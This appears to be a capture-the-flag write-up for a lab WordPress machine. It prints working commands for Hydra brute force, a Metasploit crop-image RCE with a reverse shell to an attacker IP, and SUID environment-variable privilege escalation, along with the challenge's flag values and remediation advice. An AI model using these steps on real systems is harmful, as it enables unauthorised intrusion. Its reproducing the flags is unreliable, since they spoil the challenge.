```
████████████████████████████████████████████████████████████████████████
  DIGITAL.FORENSICS || TARGET: BLOG.THM || OPERATION: RABBIT_HOLE
████████████████████████████████████████████████████████████████████████
```

### OBJECTIVE

Compromise WordPress application through credential enumeration, exploit authenticated RCE vulnerability, and escalate privileges via environment variable manipulation on SUID binary.

**TARGET DESIGNATION:** blog.thm (10.49.186.236)  
**ATTACK VECTOR:** SMB Enumeration → WordPress Brute Force → Image RCE → Privilege Escalation  
**DIFFICULTY RATING:** Intermediate  

---

### RECONNAISSANCE PHASE

**NETWORK TOPOLOGY**

```
Target: 10.49.186.236 (blog.thm)
Hostname: BLOG
Services: WordPress 5.0, Apache 2.4.29, Samba 4.7.6
OS: Ubuntu Linux
```

**PORT ENUMERATION**

| Port | Service | Purpose | Status |
|------|---------|---------|--------|
| 22 | SSH | Remote access | Open |
| 80 | HTTP | WordPress blog | Open |
| 139/445 | SMB | File sharing | Open |

**SERVICE IDENTIFICATION**

```
HTTP: Apache 2.4.29 with WordPress 5.0
CMS Detection: WordPress 5.0 (wp-generator header)
Robots.txt: Disallows /wp-admin/
SSH: OpenSSH 7.6p1 (Ubuntu)
SMB: Samba 4.7.6-Ubuntu (guest access enabled)
```

---

### ENUMERATION PHASE

**SMB SHARE DISCOVERY**

```
enum4linux -a blog.thm
```

Available shares:

```
BillySMB       Billy's local SMB Share (Disk)
IPC$           IPC Service (IPC)
print$         Printer Drivers (Disk)
```

**SMB SHARE CONTENTS**

```
smbclient //blog.thm/BillySMB -N
```

Anonymous access grants access to:

```
Alice-White-Rabbit.jpg    (33 KB image file)
tswift.mp4                (1.2 MB video file)
check-this.png            (3 KB image file)
```

Files hint at additional investigation paths. Alice-White-Rabbit.jpg and check-this.png require steganography analysis. tswift.mp4 may contain metadata or hidden information.

**WORDPRESS USER ENUMERATION**

```
wpscan --url http://blog.thm --detection-mode aggressive --api-token [TOKEN]
```

**IDENTIFIED USERS:**

| Username | Detection Method | Source |
|----------|------------------|--------|
| bjoel | Author posts, WP JSON API | Blog posts, /wp-json/wp/v2/users |
| kwheel | Author posts, WP JSON API | Blog posts, /wp-json/wp/v2/users |
| Karen Wheeler | RSS generator | Feed metadata |
| Billy Joel | RSS generator | Feed metadata |

All four accounts enumerated through passive and aggressive scanning. WordPress 5.0 exposes user enumeration through multiple vectors.

**VULNERABILITY ASSESSMENT**

Wpscan identified vulnerabilities for WordPress 5.0:

```
Priority 1: CVE-2019-8942/8943  Authenticated code execution (image processing)
Priority 2: CVE-2018-20148      PHP object injection (metadata)
Priority 3: CVE-2018-20147      Authenticated file deletion
Priority 4: CVE-2018-20152      Post-type bypass
Priority 5: CVE-2018-20149      File upload to XSS
Priority 6: CVE-2019-17671      Draft post exposure (unauthenticated)
```

Primary exploitation path: Authenticated code execution via image processing (CVE-2019-8942).

---

### CREDENTIAL ACQUISITION

**WORDPRESS LOGIN BRUTE FORCE**

```
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt \
  blog.thm http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1: F=incorrect" \
  -t 4 -V
```

Hydra performs dictionary attack against WordPress login endpoint. Each combination tested via POST request to /wp-login.php.

**CREDENTIALS DISCOVERED:**

```
Username: kwheel
Password: cutiepie1
```

Standard dictionary password. User failed to implement strong password policy.

---

### EXPLOITATION PHASE

**WORDPRESS IMAGE RCE (CVE-2019-8942)**

Vulnerability exists in WordPress image crop functionality. Authentication required but allows arbitrary code execution through image metadata processing.

**SEARCHSPLOIT ANALYSIS**

```
searchsploit WordPress 5.0 image
```

Exploit available:

```
Exploit: WordPress 5.0.0 - Image Remote Code Execution
EDB-ID: 49512
CVE: CVE-2019-8942
Type: PHP Webapps
Verified: False
```

**METASPLOIT ALTERNATIVE**

```
search crop-image

Exploit: exploit/multi/http/wp_crop_rce
Type: WordPress Crop-image Shell Upload
Disclosure: 2019-02-19
Rank: Excellent
```

Metasploit module automates exploitation. Module handles:
- Authentication with compromised credentials (kwheel:cutiepie1)
- Payload generation and encoding
- Image metadata manipulation
- RCE via crop processing

**EXPLOITATION EXECUTION**

```
set RHOSTS blog.thm
set LHOST [attacker IP]
set LPORT 4444
set USERNAME kwheel
set PASSWORD cutiepie1
set TARGETURI /
exploit
```

**SHELL ESTABLISHMENT**

```
meterpreter > shell
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

Remote code execution achieved as www-data user (Apache process owner).

---

### INITIAL ACCESS & ENUMERATION

**USER DIRECTORY EXPLORATION**

```
cd /home
ls
bjoel

cd /home/bjoel
ls
Billy_Joel_Termination_May20-2020.pdf
user.txt
```

**USER FLAG ATTEMPT**

```
cat user.txt
You won't find what you're looking for here.
TRY HARDER
```

Decoy file. Flag located elsewhere in filesystem.

**SUID BINARY DISCOVERY**

```
find / -perm -u=s -type f 2>/dev/null

/usr/bin/passwd
/usr/bin/sudo
/usr/bin/at
/usr/sbin/checker          <-- Non-standard SUID binary
/usr/bin/pkexec
```

Custom SUID binary: `/usr/sbin/checker` represents exploitation vector.

---

### PRIVILEGE ESCALATION

**SUID BINARY ANALYSIS**

```
ltrace /usr/sbin/checker
getenv("admin")    = nil
puts("Not an Admin")
exit(0)
```

Binary checks for "admin" environment variable. If unset, displays "Not an Admin" and exits. SUID bit allows execution as root regardless of current user privileges.

**EXPLOITATION VECTOR: ENVIRONMENT VARIABLE INJECTION**

Binary uses getenv() without validation. Environment variables can be set by user before SUID execution.

```
export admin=1
/usr/sbin/checker
```

**PRIVILEGE ESCALATION RESULT**

```
ltrace /usr/sbin/checker
getenv("admin")    = "1"
setuid(0)          = 0 (SUCCESS)
system("/bin/bash")
```

When admin=1 is set, binary calls setuid(0) successfully, becoming root. system("/bin/bash") spawns root shell.

**ROOT SHELL CONFIRMATION**

```
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

---

### FLAG RETRIEVAL

**USER FLAG LOCATION**

```
find / -type f -name 'user.txt' 2>/dev/null

/home/bjoel/user.txt         (decoy—incorrect)
/media/usb/user.txt          (actual flag location)
/root/root.txt               (system flag)
```

User flag hidden on mounted USB device at /media/usb/, not in expected home directory.

**USER FLAG**

```
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```

**SYSTEM FLAG**

```
cat /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port enumeration (SSH, HTTP, SMB)
  ├─ Service version detection
  └─ CMS identification (WordPress 5.0)

PHASE 2: SMB Enumeration
  ├─ Share listing (BillySMB, IPC$, print$)
  ├─ Anonymous access validation
  └─ File discovery (image/media files)

PHASE 3: WordPress Enumeration
  ├─ WP JSON API user enumeration
  ├─ RSS feed user disclosure
  ├─ Vulnerability assessment (CVE-2019-8942)
  └─ Robots.txt analysis

PHASE 4: Credential Compromise
  ├─ Hydra dictionary brute force
  ├─ WordPress login endpoint targeting
  └─ Valid credentials: kwheel:cutiepie1

PHASE 5: RCE Exploitation
  ├─ CVE-2019-8942 image crop RCE
  ├─ Metasploit wp_crop_rce module
  ├─ Authenticated payload upload
  └─ Shell establishment (www-data)

PHASE 6: Privilege Escalation
  ├─ SUID binary discovery (/usr/sbin/checker)
  ├─ Binary behavior analysis (ltrace)
  ├─ Environment variable injection (admin=1)
  ├─ setuid(0) successful execution
  └─ Root shell spawning

PHASE 7: Flag Retrieval
  ├─ Decoy flag discovery (/home/bjoel/user.txt)
  ├─ Actual user flag (/media/usb/user.txt)
  └─ System flag (/root/root.txt)
```

---

### VULNERABILITY ASSESSMENT

**CRITICAL FINDINGS**

1. **Weak User Passwords (CVSS 7.5)**
   - kwheel password "cutiepie1" found in rockyou.txt
   - No password complexity enforcement
   - Dictionary attack effective within minutes

2. **WordPress 5.0 RCE Vulnerability (CVSS 9.8)**
   - CVE-2019-8942: Image crop arbitrary code execution
   - Requires authentication but password obtained via brute force
   - Metasploit automation available—trivial exploitation

3. **Insecure SUID Binary (CVSS 8.4)**
   - /usr/sbin/checker relies on user-settable environment variable
   - No validation of admin variable value
   - Direct privilege escalation from any user to root

4. **User Enumeration (CVSS 5.3)**
   - WordPress user enumeration via multiple vectors
   - WP JSON API exposes all users
   - RSS feeds leak usernames and full names

5. **SMB Guest Access (CVSS 5.4)**
   - Anonymous SMB share access enabled
   - Shares accessible without credentials
   - Information disclosure potential

---

### REMEDIATION RECOMMENDATIONS

```
IMPLEMENT:
├─ WordPress Hardening
│  ├─ Upgrade to WordPress 5.1+ (patched version)
│  ├─ Disable WP JSON API user enumeration
│  ├─ Implement login attempt rate limiting
│  ├─ Enforce strong password policy
│  └─ Disable user enumeration via author archives
│
├─ Authentication Security
│  ├─ Enforce minimum 14-character passwords
│  ├─ Implement account lockout (5 attempts, 15 min lockout)
│  ├─ Enable two-factor authentication
│  └─ Monitor WordPress login attempts
│
├─ SUID Binary Security
│  ├─ Remove SUID bit from /usr/sbin/checker
│  ├─ Validate all environment variables (never trust user input)
│  ├─ Use seccomp/AppArmor to restrict capabilities
│  └─ Audit all custom SUID binaries
│
├─ SMB Security
│  ├─ Disable guest access
│  ├─ Restrict share access to authenticated users
│  ├─ Implement share-level access controls
│  └─ Remove public information shares
│
└─ Detection & Monitoring
   ├─ Alert on multiple failed login attempts
   ├─ Monitor SUID binary execution
   ├─ Log environment variable changes
   └─ Alert on privileged user creation/modification
```

---

### TECHNICAL NOTES

**Tools Utilized:**
- nmap (port/service enumeration)
- enum4linux (SMB enumeration)
- smbclient (SMB share access)
- wpscan (WordPress vulnerability assessment)
- hydra (credential brute force)
- searchsploit (exploit database)
- metasploit (RCE exploitation)
- ltrace (binary analysis)

**Exploitation Techniques:**
- SMB anonymous enumeration
- WordPress user enumeration (JSON API, RSS feeds)
- Dictionary brute force (WordPress login)
- Authenticated image upload RCE (CVE-2019-8942)
- Environment variable privilege escalation
- SUID binary exploitation

**Attack Duration:** ~90 minutes (end-to-end)  
**Privilege Escalation Complexity:** Simple (environment variable)  
**Key Insight:** Hidden user flag location (/media/usb/) required filesystem enumeration

---

```
████████████████████████████████████████████████████████████████████████
  OPERATION COMPLETE || BOTH FLAGS OBTAINED || ROOT ACCESS ACHIEVED
████████████████████████████████████████████████████████████████████████
```
